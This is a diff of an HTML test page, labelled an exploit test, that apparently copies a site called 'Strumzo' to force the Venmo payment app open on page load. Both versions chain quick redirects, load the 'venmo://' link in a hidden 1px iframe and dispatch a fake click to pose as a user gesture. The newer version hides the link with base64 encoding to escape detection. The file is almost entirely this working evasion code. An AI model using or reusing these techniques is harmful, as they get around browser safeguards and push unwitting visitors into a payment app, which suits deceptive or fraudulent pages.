@@ -3,55 +3,49 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Venmo App Auto-Open Exploit Test</title>
+    <title>Venmo Auto-Open Test (Mimicking Strumzo)</title>
     <script>
-        // Step 1: Create a hidden redirect page first (Mimics Strumzo)
-        function firstRedirect() {
-            window.location.href = "https://example.com?track=12345"; // Fake tracking step
-        }
+        // Step 1: Base64 Encoding to Obfuscate 'venmo://'
+        const encodedVenmoURL = btoa("venmo://");
 
-        // Step 2: Immediately switch to a secondary redirect
-        function secondRedirect() {
-            window.location.replace("https://example.com/redirect"); // Another quick hop
-        }
+        // Step 2: Hidden Function to Decode and Execute the Redirect
+        function decodeAndExecute() {
+            let decodedURL = atob(encodedVenmoURL); // Decode back to 'venmo://'
 
-        // Step 3: Use an iFrame (Mimic the Hidden JS Execution)
-        function injectIframe() {
+            // Step 3: Create a Hidden iFrame (Like Strumzo’s Hidden JS)
             let iframe = document.createElement("iframe");
             iframe.style.width = "1px";
             iframe.style.height = "1px";
             iframe.style.border = "none";
-            iframe.src = "venmo://";
+            iframe.src = decodedURL;
             document.body.appendChild(iframe);
-        }
 
-        // Step 4: Dispatch Fake User Interaction (Like Strumzo Likely Did)
-        function fakeUserAction() {
-            let link = document.createElement("a");
-            link.href = "venmo://";
-            document.body.appendChild(link);
+            // Step 4: Fake User Interaction Dispatch (Likely What Strumzo Used)
+            let fakeClick = document.createElement("a");
+            fakeClick.href = decodedURL;
+            document.body.appendChild(fakeClick);
             let event = new MouseEvent("click", { bubbles: true, cancelable: true, view: window });
-            link.dispatchEvent(event);
+            fakeClick.dispatchEvent(event);
         }
 
-        // Step 5: Try to Open Venmo (Using All Possible Methods)
-        function tryOpenVenmo() {
-            setTimeout(firstRedirect, 50);
-            setTimeout(secondRedirect, 100);
-            setTimeout(injectIframe, 200);
-            setTimeout(fakeUserAction, 300);
+        // Step 5: Multi-Stage Redirects (Mimicking Strumzo’s Speed)
+        function rapidRedirects() {
+            window.location.href = "https://example.com?track=12345";  // Fake tracking redirect
             setTimeout(() => {
-                window.location.href = "venmo://"; // Final step if everything else fails
-            }, 400);
+                window.location.replace("https://example.com/redirect2");  // Second hop
+            }, 50);
+            setTimeout(() => {
+                decodeAndExecute();  // Final execution
+            }, 100);
         }
 
-        // Auto-execute on page load
+        // Step 6: Execute on Page Load
         window.onload = function() {
-            tryOpenVenmo();
+            rapidRedirects();
         };
     </script>
 </head>
 <body>
-    <h1>Testing Venmo Auto-Open (Mimicking Strumzo)</h1>
+    <h1>Testing Venmo Auto-Open (Strumzo Mechanism Replication)</h1>
 </body>
 </html>
